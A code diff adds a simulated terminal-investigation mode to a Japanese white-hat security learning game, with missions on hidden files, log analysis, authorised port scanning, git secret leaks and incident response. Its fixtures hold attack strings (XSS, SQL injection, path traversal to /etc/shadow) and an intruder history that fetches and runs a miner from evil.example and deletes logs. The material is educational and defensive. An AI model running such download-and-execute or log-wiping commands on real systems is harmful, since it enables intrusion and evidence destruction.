@@ -172,6 +172,33 @@ ul.rules { padding-left: 20px; margin: 6px 0; }
 @keyframes blink { 50% { opacity: 0; } }
 table.sum button { white-space: nowrap; }
 table.sum td:first-child { min-width: 7em; }
+
+/* ターミナル演習 */
+.term-list button small { margin-top: 2px; }
+.term-goals { margin: 6px 0 0; padding-left: 0; list-style: none; font-size: 14px; }
+.term-goals li { padding: 3px 0; }
+.term-goals li.done { color: var(--muted); }
+.term-goals li.now { color: var(--accent); font-weight: bold; }
+.term-goals li.todo { color: #4c6b60; }
+.term { background: #050908; border: 1px solid var(--line); border-radius: 10px; font-family: var(--mono); font-size: 14px; box-shadow: inset 0 0 30px rgba(46,232,143,.05); }
+.term-out { height: 360px; overflow-y: auto; padding: 10px 12px; }
+.tl { white-space: pre-wrap; word-break: break-all; min-height: 1.4em; }
+.tl.cmdline { color: var(--accent); }
+.tl.err { color: var(--danger); }
+.tl.ok { color: var(--accent); background: rgba(46,232,143,.08); }
+.tl.goal { color: var(--accent2); }
+.tl.hint { color: var(--warn); }
+.tl.dim { color: var(--muted); }
+.term-form { display: flex; align-items: center; border-top: 1px solid var(--line); padding: 8px 12px; gap: 4px; }
+.term-prompt { color: var(--accent); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 55%; }
+.term-input { flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: var(--text); font: inherit; font-size: 16px; caret-color: var(--accent); }
+.term-chips { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
+.term-chips button { font-family: var(--mono); font-weight: normal; font-size: 13px; padding: 4px 10px; border-color: var(--line); color: var(--text); }
+@media (max-width: 600px) { .term-out { height: 300px; font-size: 13px; } }
+.cmd-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 8px; }
+.cmd-item { background: var(--panel2); border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; font-size: 14px; }
+.cmd-item b { font-family: var(--mono); color: var(--accent); margin-right: 8px; }
+.cmd-item code { display: block; font-family: var(--mono); font-size: 12px; color: var(--warn); margin-top: 4px; word-break: break-all; }
 </style>
 </head>
 <body>
@@ -192,6 +219,7 @@ table.sum td:first-child { min-width: 7em; }
         <button id="btn-quick">⚡ クイックプレイ<small>ランダムな5ミッション</small></button>
         <button id="btn-weak">💪 苦手克服モード<small>苦手な題材を5ミッション</small></button>
         <button id="btn-select">🎯 ステージを選ぶ<small>題材を1つ選んでプレイ</small></button>
+        <button id="btn-terminal">🖥️ ターミナル演習<small>コマンドを打って調査する実践モード</small></button>
       </div>
       <div class="menu-grid sub-menu">
         <button id="btn-text">📖 学習テキスト<small>15題材の解説</small></button>
@@ -375,6 +403,50 @@ table.sum td:first-child { min-width: 7em; }
       <div class="row"><h2>🏆 実績</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
       <p class="sub" id="ach-summary"></p>
       <div class="ach-grid" id="ach-grid"></div>
+    </div>
+  </section>
+
+  <!-- ターミナル演習：選択 -->
+  <section id="s-term-select" class="screen">
+    <div class="card">
+      <div class="row"><h2>🖥️ ターミナル演習</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub">本物のホワイトハッカーのように、コマンドを打ち込んでサーバーを調査するモードです。画面の中だけのシミュレーションなので、本物のコンピューターには一切つながりません。安心していろいろ試そう。</p>
+      <div class="stage-grid term-list" id="term-list"></div>
+    </div>
+    <div class="card">
+      <h3>コマンド早見表</h3>
+      <div class="cmd-list" id="cmd-list"></div>
+    </div>
+  </section>
+
+  <!-- ターミナル演習：プレイ -->
+  <section id="s-term" class="screen">
+    <div class="row" style="margin-bottom:10px"><h2 id="term-title" style="font-size:18px;margin:0"></h2><span class="spacer"></span><button class="ghost" id="btn-term-back">一覧へ</button></div>
+    <div class="card scenario" style="padding:12px 16px">
+      <div class="story-line" id="term-story"></div>
+      <div class="row"><b>目標</b><span class="spacer"></span><span class="badge" id="term-progress"></span></div>
+      <ol class="term-goals" id="term-goals"></ol>
+    </div>
+    <div class="term">
+      <div class="term-out" id="term-out"></div>
+      <form id="term-form" class="term-form" autocomplete="off">
+        <span id="term-prompt" class="term-prompt"></span>
+        <input id="term-input" class="term-input" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" enterkeyhint="send" aria-label="コマンド入力">
+      </form>
+    </div>
+    <div class="term-chips" id="term-chips"></div>
+    <div class="row" style="margin-top:10px">
+      <button class="ghost" id="btn-term-hint">💡 ヒント</button>
+      <span class="sub" style="font-size:13px">↑↓：過去のコマンド ／ Tab：ファイル名の補完</span>
+    </div>
+    <div class="card" id="term-clear" style="display:none;margin-top:14px;text-align:center">
+      <div class="title-logo" style="font-size:24px">MISSION COMPLETE</div>
+      <div class="rank" id="term-clear-stars" style="font-size:40px;color:var(--gold)"></div>
+      <p id="term-clear-text"></p>
+      <div class="row" style="justify-content:center">
+        <button class="primary" id="btn-term-next">次の演習へ</button>
+        <button id="btn-term-list">演習一覧へ</button>
+      </div>
     </div>
   </section>
 
@@ -1565,6 +1637,9 @@ const ACHIEVEMENTS = [
   { id: "all_topics", icon: "🗺️", name: "全分野制覇",             desc: "全15題材をプレイする" },
   { id: "scholar",    icon: "📖", name: "勉強家",                 desc: "学習テキストの全章を読む" },
   { id: "glossary",   icon: "🎓", name: "用語博士",               desc: "用語クイズで10問中9問以上正解" },
+  { id: "term_first", icon: "🖥️", name: "はじめてのターミナル",   desc: "ターミナル演習を1つクリア" },
+  { id: "term_nohint",icon: "🥷", name: "ノーヒント・ハッカー",   desc: "ヒントを使わずにターミナル演習をクリア" },
+  { id: "term_all",   icon: "⌨️", name: "コマンドマスター",       desc: "ターミナル演習をすべてクリア" },
 ];
 </script>
 <script>
@@ -2317,6 +2392,912 @@ document.querySelectorAll("[data-back]").forEach(b => b.addEventListener("click"
 buildSelect();
 buildText();
 renderTitle();
+</script>
+<script>
+/* =========================================================
+   ターミナル演習のデータ
+   - fs      : 仮想ファイルシステム（オブジェクト＝フォルダ、文字列＝ファイル）
+   - goals   : 目標。順番にクリアしていく
+       type "cmd"    : test(ctx) が true を返すコマンドを実行したら達成
+       type "answer" : submit <答え> で answers のどれかと一致したら達成
+   - net     : 仮想ネットワーク（nmap / ping / curl 用）
+   - custom  : そのミッションだけで使える特別なコマンド
+   本物のコンピューターやネットワークには一切つながりません。
+   ========================================================= */
+
+const HOME = "/home/whitehat";
+
+// アクセスログ（ミッション2）を組み立てる
+const T2_LOG = (() => {
+  const L = [];
+  const add = (ip, time, req, code) => L.push(`${ip} - - [06/Nov/2026:${time}] "${req} HTTP/1.1" ${code}`);
+  add("10.0.0.5", "09:58:12", "GET /index.html", 200);
+  add("10.0.0.8", "09:58:30", "GET /news", 200);
+  add("10.0.0.12", "09:59:05", "GET /about", 200);
+  add("10.0.0.5", "10:00:41", "GET /club/baseball", 200);
+  add("10.0.0.8", "10:01:15", "GET /favicon.ico", 404);
+  for (let i = 1; i <= 12; i++) add("203.0.113.77", `10:02:${String(i).padStart(2, "0")}`, "POST /login user=admin", 401);
+  add("203.0.113.77", "10:02:13", "POST /login user=admin", 200);
+  add("203.0.113.77", "10:02:20", "GET /admin/users", 200);
+  add("10.0.0.12", "10:03:02", "GET /news/2026-11", 200);
+  add("198.51.100.23", "10:05:10", "GET /search?q=<script>alert(1)<\/script>", 200);
+  add("198.51.100.23", "10:05:14", "GET /search?q=' OR 1=1 --", 500);
+  add("10.0.0.5", "10:05:30", "GET /contact", 200);
+  add("198.51.100.23", "10:05:41", "GET /download?file=../../../etc/shadow", 200);
+  add("198.51.100.23", "10:05:55", "GET /admin", 403);
+  add("10.0.0.8", "10:06:20", "GET /index.html", 200);
+  return L.join("\n");
+})();
+
+const TERMINAL_MISSIONS = [
+  /* ---------------- 1. 基本操作 ---------------- */
+  {
+    id: "t1", level: "入門", title: "はじめてのターミナル：置き忘れたファイル",
+    learn: "ls / ls -a / cd / cat / pwd",
+    host: "festival-web",
+    story: "文化祭サイトのサーバーに、開発者が秘密のファイルを置き忘れたらしい。サーバーにログインできるので、ターミナルで中を調べてみよう。",
+    fs: {
+      home: { whitehat: {
+        "readme.txt": "文化祭サイトのサーバーへようこそ。\n開発者がサーバーに秘密のファイルを置き忘れたらしい。\nまずは周りを見回してみよう。\n\nヒント：名前が「.」で始まるファイルは「隠しファイル」。\n普通の ls では表示されない。",
+        "notes.txt": "TODO: 本番公開の前に設定ファイルを消すこと！",
+        site: {
+          "index.html": "<h1>まなび祭 2026</h1>\n<p>11月20日・21日開催！</p>",
+          "style.css": "body { background: #fffbe6; }",
+        },
+        ".env": "# データベースの設定（公開しないこと）\nDB_USER=festival\nDB_PASSWORD=Matsuri2026!\nDEBUG=true",
+      } },
+    },
+    chips: ["ls", "ls -a", "cat ", "cd ", "cd ..", "pwd", "submit ", "hint", "help"],
+    goals: [
+      { type: "cmd", text: "ls と入力して Enter。今いるフォルダの中身を見よう。", hint: "そのまま「ls」と打って Enter キー。", test: c => c.cmd === "ls",
+        explain: "ls（list）は、今いるフォルダの中身を一覧表示するコマンド。名前の後ろに / が付いているものはフォルダです。" },
+      { type: "cmd", text: "cat readme.txt で、readme.txt の中身を読もう。", hint: "「cat readme.txt」と打つ。ファイル名は Tab キーで補完できる。", test: c => c.cmd === "cat" && c.paths.includes(HOME + "/readme.txt"),
+        explain: "cat は、ファイルの中身を表示するコマンド。" },
+      { type: "cmd", text: "cd site で site フォルダに入り、ls で中身を見よう。", hint: "「cd site」で移動してから「ls」。今いる場所は pwd で確認できる。", test: c => c.cmd === "ls" && (c.target === HOME + "/site"),
+        explain: "cd（change directory）はフォルダを移動するコマンド。「cd ..」で1つ上に戻れる。pwd で今いる場所を表示できる。" },
+      { type: "cmd", text: "cd .. でホームに戻り、ls -a で隠しファイルを探そう。", hint: "「cd ..」で戻ってから「ls -a」。", test: c => c.cmd === "ls" && c.flags.has("a") && c.target === HOME,
+        explain: "-a オプションを付けると、「.」で始まる隠しファイルも表示される。設定ファイルは隠しファイルになっていることが多い。" },
+      { type: "answer", text: "隠しファイルの中にある、データベースのパスワードを見つけよう。見つけたら submit パスワード で報告。", hint: "cat .env で中身を見てみよう。DB_PASSWORD= の後ろがパスワード。", answers: ["Matsuri2026!"],
+        explain: "本番サーバーに .env が残っていると、Webから読まれてデータベースに侵入される危険がある。公開前に不要なファイルは必ず消そう。" },
+    ],
+    summary: "ls・cd・cat はターミナルの基本中の基本。そして「隠しファイル」に大事な情報が入っていることが多いのも覚えておこう。",
+  },
+
+  /* ---------------- 2. ログ調査 ---------------- */
+  {
+    id: "t2", level: "初級", title: "ログから攻撃者を探せ",
+    learn: "head / grep / | （パイプ） / wc -l",
+    host: "manabi-web",
+    story: "学校のWebサーバーに不審なアクセスがあった。アクセスログ（access.log）から、攻撃者の正体と手口を突き止めよう。",
+    fs: {
+      home: { whitehat: {
+        "access.log": T2_LOG,
+        "readme.txt": "access.log … Webサーバーのアクセス記録\n\n書式：IPアドレス - - [日時] \"リクエスト\" ステータスコード\n200=成功 401=ログイン失敗 403=禁止 404=なし 500=サーバーエラー",
+      } },
+    },
+    chips: ["head access.log", "grep ", "| wc -l", "| grep ", "cat readme.txt", "submit ", "hint", "help"],
+    goals: [
+      { type: "cmd", text: "head access.log で、ログの最初の10行を見てみよう。", hint: "「head access.log」と打つ。ログの読み方は cat readme.txt でも確認できる。", test: c => (c.cmd === "head" || c.cmd === "cat") && c.paths.includes(HOME + "/access.log"),
+        explain: "head はファイルの先頭だけを表示するコマンド（tail なら最後）。長いログは cat だと読みにくいので head や tail を使う。" },
+      { type: "cmd", text: "grep 401 access.log で、ログイン失敗（401）の行だけを取り出そう。", hint: "「grep 401 access.log」と打つ。", test: c => c.cmd === "grep" && c.args.includes("401"),
+        explain: "grep は、指定した文字を含む行だけを取り出すコマンド。大量のログから必要な行を探すときに大活躍する。" },
+      { type: "answer", text: "ログイン失敗を何度も繰り返している攻撃者のIPアドレスを submit しよう。", hint: "grep 401 access.log の結果で、同じIPアドレスが何度も出てくるはず。", answers: ["203.0.113.77"],
+        explain: "短時間に同じIPからログイン失敗が続くのは、パスワード総当たり攻撃（ブルートフォース）の典型的な痕跡。" },
+      { type: "answer", text: "そのIPからのログイン失敗は何回？ grep 203.0.113.77 access.log | grep 401 | wc -l で数えよう。", hint: "「|」（パイプ）は、前のコマンドの結果を次のコマンドに渡す記号。wc -l は行数を数える。", answers: ["12", "12回"],
+        explain: "パイプ（|）でコマンドをつなげると、「絞り込んで→さらに絞り込んで→数える」ができる。ちなみに 401 で絞らないと13行になる。最後の1行はステータス200…つまりログインに成功されている！" },
+      { type: "answer", text: "別のIPが「../」を使ったディレクトリトラバーサルを試している。grep で「..」を探して、狙われたファイルのフルパスを submit しよう。（例：/etc/xxxx）", hint: "grep .. access.log で探してみよう。file= の後ろの ../ を取り除くと…？", answers: ["/etc/shadow", "etc/shadow"],
+        explain: "/etc/shadow は、Linuxのパスワードのハッシュが保存された超重要ファイル。" },
+      { type: "answer", text: "その攻撃は成功した？ その行のステータスコードを submit しよう。", hint: "行の一番最後の数字。200なら成功、403や404なら失敗。", answers: ["200"],
+        explain: "ステータス200＝成功。重要ファイルが盗まれた可能性が高い。すぐに管理者に報告し、機能を止める必要がある緊急事態だ。" },
+    ],
+    summary: "ログ調査の基本は「grep で絞り込む → パイプでつなぐ → 数える」。本物のセキュリティ担当者も毎日こうやってログを調べている。",
+  },
+
+  /* ---------------- 3. 偵察 ---------------- */
+  {
+    id: "t3", level: "中級", title: "サーバーを偵察せよ",
+    learn: "ping / nmap / curl / robots.txt",
+    host: "whitehat-pc",
+    story: "まなび高校から、Webサーバーの脆弱性診断を正式に依頼された。外から見て危ないところがないか、攻撃者と同じ目線で調べてみよう。",
+    scope: ["192.168.10.5"],
+    net: {
+      "192.168.10.5": {
+        name: "manabi-web",
+        ports: [
+          { port: 22, service: "ssh", version: "OpenSSH 7.6p1" },
+          { port: 23, service: "telnet", version: "Linux telnetd" },
+          { port: 80, service: "http", version: "Apache httpd 2.4.29" },
+          { port: 3306, service: "mysql", version: "MySQL 5.7.21" },
+        ],
+        web: {
+          "/": "<html>\n<head><title>まなび高校</title></head>\n<body>\n  <h1>まなび高校へようこそ</h1>\n  <!-- TODO: バックアップの場所は robots.txt に書いておいた -->\n</body>\n</html>",
+          "/robots.txt": "User-agent: *\nDisallow: /admin/\nDisallow: /backup/",
+          "/backup/": "Index of /backup/\n\n  config.bak     2019-04-01 10:00   1.2K\n  db_2019.sql    2019-04-01 10:00   88M",
+          "/backup/config.bak": "# 管理画面の設定（旧サーバーからコピー）\nadmin_user=admin\nadmin_pass=Kanri@2019",
+          "/admin/": "401 Unauthorized - ログインが必要です",
+        },
+      },
+    },
+    fs: {
+      home: { whitehat: {
+        "readme.txt": "【脆弱性診断 許可書】No. WH-2026-015\n依頼主：まなび高校\n診断対象：192.168.10.5（Webサーバー）のみ\n\n※許可されていないIPアドレスを調べることは禁止。\n  勝手に調べると不正アクセス禁止法などの法律違反になる。",
+      } },
+    },
+    chips: ["cat readme.txt", "ping 192.168.10.5", "nmap 192.168.10.5", "nmap -sV 192.168.10.5", "curl http://192.168.10.5/", "submit ", "hint", "help"],
+    goals: [
+      { type: "cmd", text: "まずは cat readme.txt で、診断してよい範囲（許可書）を確認しよう。", hint: "「cat readme.txt」と打つ。", test: c => c.cmd === "cat" && c.paths.includes(HOME + "/readme.txt"),
+        explain: "ホワイトハッカーの最初の仕事は「どこまで調べてよいか」の確認。許可された範囲の外を調べたら、それはもう攻撃だ。" },
+      { type: "cmd", text: "ping 192.168.10.5 で、診断対象のサーバーが動いているか確認しよう。", hint: "「ping 192.168.10.5」と打つ。", test: c => c.cmd === "ping" && c.args.includes("192.168.10.5"),
+        explain: "ping は、相手のコンピューターに「生きてる？」と小さなデータを送って返事を確かめるコマンド。" },
+      { type: "cmd", text: "nmap 192.168.10.5 で、開いているポート（通信の出入口）を調べよう。", hint: "「nmap 192.168.10.5」と打つ。", test: c => c.cmd === "nmap" && c.args.includes("192.168.10.5"),
+        explain: "nmap はポートスキャンをするツール。どんなサービスが動いているかが分かる。攻撃者も最初にこれをやる。-sV を付けるとバージョンも分かる。" },
+      { type: "answer", text: "暗号化されず、パスワードを盗み見られる危険なリモートログイン用のポート番号を submit しよう。", hint: "nmap の結果で、telnet が使っているポート番号は？", answers: ["23", "23/tcp"],
+        explain: "Telnet（23番）は通信が暗号化されない。代わりに暗号化された SSH（22番）を使うべき。" },
+      { type: "answer", text: "インターネットに公開してはいけない、データベースのポート番号を submit しよう。", hint: "nmap の結果で、mysql が使っているポート番号は？", answers: ["3306", "3306/tcp"],
+        explain: "データベースは外部から直接触れないようにするのが基本。ファイアウォールで閉じるべき。" },
+      { type: "cmd", text: "Webサーバーも調べよう。curl http://192.168.10.5/ でトップページのHTMLを見てみよう。", hint: "「curl http://192.168.10.5/」と打つ。", test: c => c.cmd === "curl" && /192\.168\.10\.5\/?$/.test(c.args.find(a => a.includes("192.168.10.5")) || ""),
+        explain: "curl は、ブラウザの代わりにWebページを取得するコマンド。HTMLのコメント（<!-- -->）は画面に表示されないが、誰でも読める。" },
+      { type: "cmd", text: "HTMLのコメントにあったヒントに従い、curl で robots.txt を見てみよう。", hint: "「curl http://192.168.10.5/robots.txt」と打つ。", test: c => c.cmd === "curl" && c.args.some(a => a.includes("robots.txt")),
+        explain: "robots.txt は検索エンジンに「ここは載せないで」と伝えるファイル。でも誰でも読めるので、隠したい場所を書くと逆に攻撃者に教えることになる。" },
+      { type: "answer", text: "robots.txt に書かれていた /backup/ を curl で調べ、置き忘れられたファイルから管理者のパスワードを見つけて submit しよう。", hint: "curl http://192.168.10.5/backup/ でファイル一覧が見える。その中のファイルも curl で開いてみよう。", answers: ["Kanri@2019"],
+        explain: "公開フォルダにバックアップを置くのは危険。robots.txt は「立入禁止の看板」なだけで、鍵ではない。ここまで分かったら、依頼主に報告書を出して直してもらおう。" },
+    ],
+    summary: "攻撃者は「ポートスキャン → Webの調査 → 置き忘れの発見」の順で弱点を探す。ホワイトハッカーは、それを許可された範囲で先にやって、穴をふさいでもらう。",
+  },
+
+  /* ---------------- 4. ソースコード調査 ---------------- */
+  {
+    id: "t4", level: "中級", title: "ソースコードから秘密を探せ",
+    learn: "find / grep -r / git log / git show",
+    host: "dev-pc",
+    story: "部活動アプリのソースコードをGitHubで公開する前に、秘密情報が混ざっていないかチェックしてほしいと頼まれた。",
+    fs: {
+      home: { whitehat: {
+        "readme.txt": "app/ … チェックするアプリのソースコード（Gitで管理されている）\n\n調べること：\n1. コードの中にパスワードやAPIキーが書かれていないか\n2. Gitの履歴に秘密情報が残っていないか",
+        app: {
+          "README.md": "# 部活動アプリ\n部活の連絡をまとめるアプリです。",
+          "package.json": "{\n  \"name\": \"club-app\",\n  \"version\": \"1.0.0\"\n}",
+          ".gitignore": "node_modules/",
+          src: {
+            "index.js": "const api = require(\"./api\");\nconst utils = require(\"./utils\");\napi.start();",
+            "api.js": "// 外部APIとの通信\nconst API_URL = \"https://api.club-app.example\";\nconst API_KEY = \"sk_live_51Hx9QmanabiSECRET\";\nfunction start() {\n  fetch(API_URL + \"/news?key=\" + API_KEY);\n}\nmodule.exports = { start };",
+            "utils.js": "function formatDate(d) {\n  return d.toLocaleDateString(\"ja-JP\");\n}\nmodule.exports = { formatDate };",
+          },
+          public: {
+            "index.html": "<h1>部活動アプリ</h1>\n<script src=\"bundle.js\"><\/script>",
+          },
+        },
+      } },
+    },
+    git: {
+      root: HOME + "/app",
+      log: [
+        { hash: "e7a91c2", msg: "APIの設定を追加", date: "2026-10-30" },
+        { hash: "3b8d0f4", msg: ".envを削除", date: "2026-10-28" },
+        { hash: "9c4e2a1", msg: "メール送信機能を追加（.envも追加）", date: "2026-10-27" },
+        { hash: "1f0d3b7", msg: "最初のコミット", date: "2026-10-20" },
+      ],
+      show: {
+        e7a91c2: "diff --git a/src/api.js b/src/api.js\n+const API_KEY = \"sk_live_51Hx9QmanabiSECRET\";",
+        "3b8d0f4": "diff --git a/.env b/.env\ndeleted file mode 100644\n-MAIL_USER=info@club-app.example\n-MAIL_PASSWORD=Yuubin#777",
+        "9c4e2a1": "diff --git a/.env b/.env\nnew file mode 100644\n+MAIL_USER=info@club-app.example\n+MAIL_PASSWORD=Yuubin#777\ndiff --git a/src/mail.js b/src/mail.js\n+require(\"dotenv\").config();",
+        "1f0d3b7": "diff --git a/README.md b/README.md\n+# 部活動アプリ",
+      },
+    },
+    chips: ["cd app", "find . -name \"*.js\"", "grep -r API_KEY .", "git log", "git show ", "submit ", "hint", "help"],
+    goals: [
+      { type: "cmd", text: "cd app でアプリのフォルダに入り、find . -name \"*.js\" でJavaScriptのファイルを全部探そう。", hint: "「cd app」のあと「find . -name \"*.js\"」。* は「何でもいい」という意味。", test: c => c.cmd === "find" && c.args.includes("-name"),
+        explain: "find はファイルを探すコマンド。-name で名前を指定できる。*.js は「.js で終わる全部」という意味（ワイルドカード）。" },
+      { type: "cmd", text: "grep -r API_KEY . で、フォルダの中の全ファイルから「API_KEY」を探そう。", hint: "「grep -r API_KEY .」と打つ。最後の . は「今いるフォルダ」。", test: c => c.cmd === "grep" && c.flags.has("r"),
+        explain: "grep に -r を付けると、フォルダの中の全ファイルをまとめて検索できる。秘密情報のチェックによく使う方法。" },
+      { type: "answer", text: "本番用のAPIキーが直接書かれているファイルの名前を submit しよう。（例：xxx.js）", hint: "grep -r の結果は「ファイルのパス:見つかった行」の形で表示される。", answers: ["api.js", "src/api.js", "./src/api.js", "app/src/api.js"],
+        explain: "APIキーをコードに直接書く（ハードコード）と、公開した瞬間に盗まれる。環境変数などに分けて管理しよう。" },
+      { type: "cmd", text: "次はGitの履歴を調べる。git log でこれまでのコミット（変更の記録）を見よう。", hint: "app フォルダの中で「git log」と打つ。", test: c => c.cmd === "git" && c.args[0] === "log",
+        explain: "git log は、いつ・誰が・何を変更したかの履歴を表示する。Gitは過去のすべての状態を覚えている。" },
+      { type: "answer", text: "履歴に「.envを追加」して「削除」した跡がある。git show コミット番号 で中身を見て、メールのパスワードを submit しよう。", hint: "「git show 9c4e2a1」のように、コミット番号を指定する。", answers: ["Yuubin#777"],
+        explain: "ファイルを消しても、Gitの履歴にはずっと残る。公開リポジトリなら誰でも過去のコミットを見られる。" },
+      { type: "answer", text: "最後の質問。秘密情報が漏れていると分かったとき、最初にやるべきことは？ 番号を submit しよう。\n  1: その行を消してコミットする\n  2: キーやパスワードを無効化・変更する\n  3: 誰も見ていないはずなので放置する", hint: "消しても履歴に残るし、すでにコピーされているかもしれない…", answers: ["2"],
+        explain: "まずは漏れた鍵そのものを使えなくするのが最優先。そのあとで .gitignore に .env を追加し、履歴の削除も検討する。" },
+    ],
+    summary: "公開前の「秘密情報チェック」は、grep -r とGitの履歴調査が基本。漏れたらまず無効化、を忘れずに。",
+  },
+
+  /* ---------------- 5. インシデント対応 ---------------- */
+  {
+    id: "t5", level: "上級", title: "侵入者を追跡せよ",
+    learn: "ログ調査 / find / 遮断・パスワード変更・報告",
+    host: "manabi-web",
+    story: "緊急事態！ 夜中に学校のサーバーへ何者かが侵入した。足取りを突き止め、被害を食い止め、報告するまでがホワイトハッカーの仕事だ。",
+    fs: {
+      home: {
+        whitehat: {
+          "readme.txt": "【緊急】サーバーに侵入された可能性あり\n\n手がかり：\n・ログイン記録は /var/log/auth.log にある\n・各ユーザーのコマンド履歴は、ホームフォルダの .bash_history にある\n\n注意：証拠となるファイルは消さないこと！",
+        },
+        admin: {
+          ".bash_history": "cd /tmp\nmkdir .x\ncd .x\nwget http://evil.example/miner.sh\nchmod +x miner.sh\n./miner.sh &\nrm /var/log/nginx/access.log\nexit",
+        },
+        teacher: {
+          "memo.txt": "来週の授業：ネットワークの基礎",
+        },
+      },
+      var: { log: {
+        "auth.log": [
+          "Nov  6 02:10:01 manabi-web sshd: Accepted publickey for teacher from 10.0.0.12",
+          "Nov  6 02:14:22 manabi-web sshd: Failed password for root from 45.33.10.8",
+          "Nov  6 02:14:23 manabi-web sshd: Failed password for root from 45.33.10.8",
+          "Nov  6 02:14:24 manabi-web sshd: Failed password for invalid user test from 45.33.10.8",
+          "Nov  6 02:14:25 manabi-web sshd: Failed password for admin from 45.33.10.8",
+          "Nov  6 02:14:26 manabi-web sshd: Failed password for admin from 45.33.10.8",
+          "Nov  6 02:15:10 manabi-web sshd: Accepted password for admin from 45.33.10.8",
+          "Nov  6 02:15:40 manabi-web sudo: admin : COMMAND=/usr/bin/wget http://evil.example/miner.sh",
+          "Nov  6 02:16:02 manabi-web sudo: admin : COMMAND=/bin/rm /var/log/nginx/access.log",
+          "Nov  6 08:30:15 manabi-web sshd: Accepted publickey for teacher from 10.0.0.12",
+        ].join("\n"),
+        "syslog": "Nov  6 02:16:30 manabi-web kernel: CPU使用率 100% が続いています",
+        nginx: { "error.log": "" },
+      } },
+      tmp: {
+        ".x": { "miner.sh": "#!/bin/sh\n# 仮想通貨を勝手に採掘するプログラム（マイナー）\nwhile true; do mine --pool evil.example; done" },
+        "session.tmp": "",
+      },
+    },
+    chips: ["cat readme.txt", "cd /var/log", "ls", "grep Accepted auth.log", "cat /home/admin/.bash_history", "find / -name ", "submit ", "hint"],
+    goals: [
+      { type: "cmd", text: "cat readme.txt で状況を確認したら、cd /var/log でログのフォルダに移動して ls しよう。", hint: "「cd /var/log」のあと「ls」。/ から始まる場所の指定を「絶対パス」という。", test: c => c.cmd === "ls" && c.target === "/var/log",
+        explain: "Linuxでは、ログは /var/log に集められている。auth.log はログイン（認証）の記録。" },
+      { type: "answer", text: "auth.log を調べて、ログインに成功した侵入者のIPアドレスを submit しよう。", hint: "grep Accepted auth.log で、ログイン成功の行だけを見よう。校内（10.0.0.x）ではないIPは？", answers: ["45.33.10.8"],
+        explain: "Failed（失敗）の連続のあとに Accepted（成功）。パスワード総当たりで侵入されたことが分かる。" },
+      { type: "answer", text: "侵入者に乗っ取られたアカウント名を submit しよう。", hint: "そのIPから「Accepted password for ○○」となっている行の○○。", answers: ["admin"],
+        explain: "admin のパスワードが弱かったため、総当たりで破られてしまった。" },
+      { type: "answer", text: "侵入者は admin のコマンド履歴を消し忘れていた。/home/admin/.bash_history を読んで、ダウンロードされた不正なファイルの名前を submit しよう。", hint: "cat /home/admin/.bash_history で読める。wget はファイルをダウンロードするコマンド。", answers: ["miner.sh"],
+        explain: "侵入者はマイナー（他人のコンピューターで勝手に仮想通貨を採掘するプログラム）を仕掛け、アクセスログまで消して証拠を隠そうとしていた。" },
+      { type: "cmd", text: "find / -name miner.sh で、不正なファイルが今どこにあるか探そう。", hint: "「find / -name miner.sh」と打つ。/ はコンピューター全体の一番上の場所。", test: c => c.cmd === "find" && c.args.includes("miner.sh"),
+        explain: "「.」で始まる隠しフォルダ（/tmp/.x）に隠されていた。侵入者はよく隠しフォルダを使う。見つけても、すぐには消さずに証拠として保全する。" },
+      { type: "cmd", text: "被害を食い止めよう。block 45.33.10.8 で、侵入者のIPアドレスからの通信を遮断しよう。", hint: "「block 45.33.10.8」と打つ。", test: c => c.cmd === "block" && c.args.includes("45.33.10.8"),
+        explain: "まずは被害の拡大を防ぐ（封じ込め）。攻撃元からの通信を遮断した。" },
+      { type: "cmd", text: "passwd admin で、乗っ取られたアカウントのパスワードを変更しよう。", hint: "「passwd admin」と打つ。", test: c => c.cmd === "passwd" && c.args.includes("admin"),
+        explain: "破られたパスワードはすぐに変更。可能なら、パスワード認証をやめて鍵認証にし、root/adminへの直接ログインも禁止する。" },
+      { type: "cmd", text: "最後に report と入力して、調査結果を管理者に報告しよう。", hint: "「report」と打つ。", test: c => c.cmd === "report",
+        explain: "検知 → 調査 → 封じ込め → 報告。これがインシデント対応の流れ。報告して初めて、組織として再発防止に取り組める。" },
+    ],
+    summary: "侵入の痕跡はログ・コマンド履歴・隠しファイルに残る。証拠は消さず、封じ込めて、必ず報告する。これで君も一人前のホワイトハッカーだ！",
+    custom: {
+      block: (args, st) => {
+        const ip = args[0];
+        if (!ip) return "使い方: block <IPアドレス>";
+        if (ip.startsWith("10.")) return `⚠ ${ip} は校内のIPアドレスです。先生のPCを遮断してしまいます！`;
+        st.blocked = ip;
+        return `[ファイアウォール] ${ip} からの通信を遮断しました。`;
+      },
+      passwd: (args, st) => {
+        const u = args[0] || "whitehat";
+        st.passwd = u;
+        return `ユーザー ${u} の新しいパスワードを設定しました（シミュレーション）。\n※ 長く、推測されにくく、他で使っていないパスワードにしよう。`;
+      },
+      report: (args, st) => [
+        "========== インシデント報告書 ==========",
+        "発生日時 : 11月6日 02:14 〜 02:16",
+        "攻撃元   : 45.33.10.8",
+        "原因     : admin アカウントへのパスワード総当たり攻撃",
+        "被害     : 不正プログラム（/tmp/.x/miner.sh）の設置、アクセスログの削除",
+        `対応     : ${st.blocked ? "攻撃元IPの遮断 済" : "攻撃元IPの遮断 未"} ／ ${st.passwd === "admin" ? "adminのパスワード変更 済" : "adminのパスワード変更 未"}`,
+        "今後     : 鍵認証への切り替え、ログの別サーバー保存、不正プログラムの解析",
+        "=======================================",
+        "管理者に報告しました。",
+      ].join("\n"),
+    },
+  },
+];
+
+/* コマンド早見表（help と早見表で使う） */
+const COMMAND_HELP = [
+  { cmd: "ls", desc: "フォルダの中身を表示", ex: "ls / ls -a（隠しファイルも）/ ls -l（詳しく）" },
+  { cmd: "cd", desc: "フォルダを移動", ex: "cd site / cd ..（1つ上）/ cd（ホームへ）" },
+  { cmd: "pwd", desc: "今いる場所を表示", ex: "pwd" },
+  { cmd: "cat", desc: "ファイルの中身を表示", ex: "cat readme.txt" },
+  { cmd: "head / tail", desc: "ファイルの最初 / 最後だけ表示", ex: "head access.log / tail -n 5 access.log" },
